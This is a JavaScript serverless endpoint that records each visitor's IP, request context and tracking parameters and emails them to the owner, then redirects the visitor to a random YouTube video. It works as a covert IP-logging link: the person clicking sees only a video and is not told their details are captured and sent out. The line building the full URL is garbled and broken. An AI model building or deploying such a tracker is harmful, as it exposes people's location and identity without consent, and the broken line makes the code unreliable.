// api/index.js
require('dotenv').config();
const { getVisitContext, isPrivateIP, shouldSendForIp } = require('../lib/utils');
const { sendVisitEmail } = require('../lib/email');

const YOUTUBE_VIDEOS = [
  'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
  'https://www.youtube.com/watch?v=9bZkp7q19f0',
  'https://www.youtube.com/watch?v=kJQP7kiw5Fk',
  'https://www.youtube.com/watch?v=OPf0YbXqDm0',
  'https://www.youtube.com/watch?v=CevxZvSJLk8',
  'https://www.youtube.com/watch?v=kffacxfA7G4',
  // أضف اللي تحبه
];

module.exports = async (req, res) => {
  if (req.method === 'HEAD') {
    res.statusCode = 200;
    return res.end();
  }

  if (req.method !== 'GET') {
    res.statusCode = 405;
    return res.end('Method Not Allowed');
  }

  const ctx = getVisitContext(req);

  // ==== إصلاح الـ URL زي ما عملنا قبل كده ====
  let qp;
  try {
    const proto = req.headers['x-forwarded-proto'] || 'https';
    const host = req.headers.host || 'localhost';
    const cleanPath = req.url.split('?')[0];
    const pathToUse = (cleanPath === '/' || cleanPath === '') ? '/' : cleanPath;
    const queryString = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
    const fullUrl = `\( {proto}:// \){host}\( {pathToUse} \){queryString}`;
    qp = new URL(fullUrl).searchParams;
  } catch {
    qp = new URLSearchParams(req.url.split('?')[1] || '');
  }

  const payload = {
    utm: {
      source: qp.get('utm_source') || null,
      medium: qp.get('utm_medium') || null,
      campaign: qp.get('utm_campaign') || null,
      term: qp.get('utm_term') || null,
      content: qp.get('utm_content') || null,
    },
    userId: qp.get('userId') || null,
    sessionId: qp.get('sessionId') || null,
  };

  const ip = ctx.clientIP;
  const canSend = shouldSendForIp(ip);

  // ← أهم حاجة: نستنى الإيميل يخلّص (أو يفشل) قبل الريدايركت
  if (canSend && process.env.EMAIL_TO && process.env.EMAIL_USER && process.env.EMAIL_APP_PASSWORD) {
    try {
      await sendVisitEmail({ payload, context: ctx });
      console.log(`[EMAIL] sent successfully for ${ip}`);
    } catch (err) {
      console.error('[EMAIL] failed but continuing:', err.message);
      // حتى لو الإيميل فشل، نكمل عادي (مش نوقف الريدايركت)
    }
  }

  // بعد ما الإيميل خلّص أو فشل → نعمل ريدايركت
  const randomVideo = YOUTUBE_VIDEOS[Math.floor(Math.random() * YOUTUBE_VIDEOS.length)];

  res.statusCode = 302;
  res.setHeader('Location', randomVideo);
  res.setHeader('Cache-Control', 'no-store');
  res.end();
};